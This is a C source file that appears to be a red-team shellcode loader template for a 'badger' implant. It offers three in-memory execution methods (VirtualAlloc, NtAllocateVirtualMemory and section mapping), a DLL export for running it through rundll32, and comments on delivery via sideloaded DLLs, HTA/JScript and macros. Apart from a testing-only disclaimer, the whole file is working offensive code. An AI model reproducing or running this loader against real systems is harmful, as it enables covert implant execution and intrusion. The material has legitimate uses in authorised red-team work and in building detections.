// NOTE: DO NOT USE THIS TEMPLATE IN ACTIVE ENGAGEMENTS
// THIS IS ONLY SUPPOSED TO BE USED FOR TRIAL AND TESTING
// SIMILAR TECHNIQUES CAN BE USED INSIDE SIDELOADED DLLS
// OR C-SHARP CODE IN HTA/JSCRIPT/MACROS IN ENGAGEMENTS

// Don't call VirtualFree/NtFreeVirtualMemory or NtUnmapViewOfSection to unmap a memory region
// The allocated memory for badger's shellcode does not require cleaning up. Badger is nice. It does that for you :)
// however if you execute the staging payload, you will have to cleanup after it

#include <windows.h>
#include <stdio.h>
#include <winternl.h>
#include "shellcode.h"

// when compiled as an exe, void main acts as the entrypoint
// when compiled as a dll, void main is exported, and the exported function can be called with: 'rundll32.exe shellcode.dll,main'
#ifdef BUILDDLL
__declspec(dllexport) void main();
#endif

extern NTSTATUS NtCreateSection(PHANDLE SectionHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PLARGE_INTEGER MaximumSize, ULONG SectionPageProtection, ULONG AllocationAttributes, HANDLE FileHandle);
extern NTSTATUS NtMapViewOfSection(HANDLE SectionHandle, HANDLE ProcessHandle, PVOID *BaseAddress, ULONG_PTR ZeroBits, SIZE_T CommitSize, PLARGE_INTEGER SectionOffset, PSIZE_T ViewSize, ULONG InheritDisposition, ULONG AllocationType, ULONG Win32Protect);
extern NTSTATUS NtUnmapViewOfSection(HANDLE ProcessHandle, PVOID BaseAddress);

extern NTSTATUS NtAllocateVirtualMemory(HANDLE ProcessHandle, PVOID *BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);
extern NTSTATUS NtProtectVirtualMemory(IN HANDLE ProcessHandle, IN OUT PVOID *BaseAddress, IN OUT PSIZE_T NumberOfBytesToProtect, IN ULONG NewAccessProtection, OUT PULONG OldAccessProtection);

void valloc_badger() {
    DWORD dwOldProtect = 0;
    LPVOID addressPointer = VirtualAlloc(NULL, badger_bin_len, MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE);
    memcpy(addressPointer, badger_bin, badger_bin_len);
    VirtualProtect(addressPointer, badger_bin_len, PAGE_EXECUTE_READ, &dwOldProtect);
    ((void(*)())addressPointer)();
};

void ntalloc_badger() {
    ULONG ulOldProtect = 0;
    LPVOID addressPointer = NULL;
    SIZE_T shellcodeSize = (SIZE_T) badger_bin_len;
    NtAllocateVirtualMemory((HANDLE)-1, &addressPointer, 0, &shellcodeSize, MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE);
    memcpy(addressPointer, badger_bin, badger_bin_len);
    NtProtectVirtualMemory((HANDLE)-1, &addressPointer, &shellcodeSize, PAGE_EXECUTE_READ, &ulOldProtect);
    ((void(*)())addressPointer)();
};

void ntmapview_badger() {
    HANDLE hMainShellcodeSection = NULL;
    LPVOID hlocalSection = NULL;
    LARGE_INTEGER mainSectionSize = { badger_bin_len };
    SIZE_T localMapViewSize = 0;

    NtCreateSection(&hMainShellcodeSection, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, NULL, &mainSectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, (HANDLE)NULL);
    localMapViewSize = (SIZE_T) mainSectionSize.QuadPart;
    NtMapViewOfSection(hMainShellcodeSection, (HANDLE)-1, &hlocalSection, 0, 0, 0, &localMapViewSize, 2, 0, PAGE_READWRITE);
    memcpy(hlocalSection, badger_bin, badger_bin_len);
    NtUnmapViewOfSection((HANDLE)-1, hlocalSection);
    hlocalSection = NULL;
    localMapViewSize = (SIZE_T) mainSectionSize.QuadPart;
    NtMapViewOfSection(hMainShellcodeSection, (HANDLE)-1, &hlocalSection, 0, 0, 0, &localMapViewSize, 2, 0, PAGE_EXECUTE_READ);
    ((void(*)())hlocalSection)();
};

void main() {
    // Only enable one function at a time here
    valloc_badger();
    // ntalloc_badger();
    // ntmapview_badger();

    // the executed shellcode returns after creating a new thread with a spoofed thread entrypoint
    // Since the thread entrypoint returns, it's recommended not to wait on the thread's handle
    // Rather wait on the current process's handle so that the process does not exit
    // If thread wait is required, use the 'wait' shellcode instead of the 'ret' one when generating shellcode from the badger
    WaitForSingleObject((HANDLE)-1, -1);
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved) {
	BOOL bReturnValue = TRUE;
	switch (dwReason) {
        case DLL_PROCESS_ATTACH: {
            break;
        }
        case DLL_PROCESS_DETACH:
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
            break;
	}
	return bReturnValue;
}